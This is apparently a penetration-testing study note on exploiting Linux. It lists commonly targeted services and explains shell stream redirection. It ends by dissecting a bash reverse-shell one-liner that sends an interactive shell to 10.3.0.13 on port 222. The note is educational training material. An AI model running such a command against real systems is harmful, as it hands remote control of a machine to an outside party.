# Exploiting Linux

## Contents
- [Overview](#overview)
- [Frequently Exploited Services](#frequently-exploited-services)

## Overview 

- Linux is a free and open-source operating system that is comprised of the Linux kernel, which was developed by Linus Torvalds, and the GNU toolkit, which is a collection of software and utilities that was started and developed by Richard Stallman.
- This combination of open-source software is what makes up the Linux O/S as a whole, and it is commonly referred to as GNU/Linux.
- Linux has various use cases. However, it is typically deployed as a server operating system. For this reason, there are specific services and protocols that will typically be found running on a Linux server.
- These services provide an attacker with an access vector that he can utilize to gain access to a target host.
- Having a good understanding of what these services are, how they work, and their potential vulnerabilities is a vitally important skill to have a penetration tester.

## Frequently Exploited Services 

|  Protocol/Service  |  Ports  |  Purpose  |
| :---------------:  |  :---:  |  -------  |
| Apache Web Server | TCP Ports 80 & 443 | Free and open-source cross-platform web server released under the Apache License 2.0. Apache accounts for over 80% of web servers globablly |
| SSH | TCP Port 22 | SSH (Secure Shell) is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet |
| FTP | TCP Port 21 | FTP (File Transfer Protocol) is a protocol that facilitates file sharing between a server and a client, and vice versa | 
| Samba | TCP Port 445 | Samba is the Linxu implementation of the SMB protocol, and it allows Windows systems to access Linux shares and devices |

## Linux Standard Streams

- **_Linux Streams_:** There are three standard "streams" of data in Linux and they are referred to with the following values:
  - `0: stdin`&nbsp;&nbsp;&nbsp;(from keyboard)
  - `1: stdout`&nbsp;&nbsp;(default: to display)
  - `2: stderr`&nbsp;&nbsp;(default: to display)
 
- To explicitly redirect `stdout`, use this redirection instruction: `1>`
  -  `>` is shorthand for `1>`
  -  Example: This redirects stdout into a text file instead of to the default (display)
```
 echo "This is content." > text_file.txt
```

- To explicitly redirect `stderr`, use this redirection instruction: `2>`
  - Example: This will redirect stderr to a file called capture.txt.
```
./error.sh 2> capture.txt
```
  - Example: This redirects stdout to capture.txt and stderr to error.txt
```
./error.sh 1> capture.txt 2> error.txt
```

- Redirecting to the Same File:
```
./error.sh > capture.txt 2>&1
```
  - `./error.sh` : Launches the error.sh script file.
  - `> capture.txt` : Redirects the stdout (1) stream to the capture.txt file. REMEMBER: > is shorthand for 1>.
  - `2>&1` : This uses the >& redirect instruction.
    - This instruction allows you to tell the shell to make one stream go to the same destination as another stream.
    - In this case, we're saying "redirect stream 2, stderr, to the same destination that stream 1, stdout, is being redirected to" (i.e., into the capture.txt file)
   
- Analysis of Syntax:
```
bash -i &> /dev/tcp/10.3.0.13/222 0>&1
```
  - `bash -i` : opens an interactive shell (a session that begins with your login and ends when you type 'exit' to logout).
  - `&>` : redirects the standard output and error to the socket opened to the IP 10.3.0.13 which would be listening on port 222
  - `0>&1` : stdin is attached to stdout (and from &> we know that the stdin for this bash process is from 10.3.0.13:222.
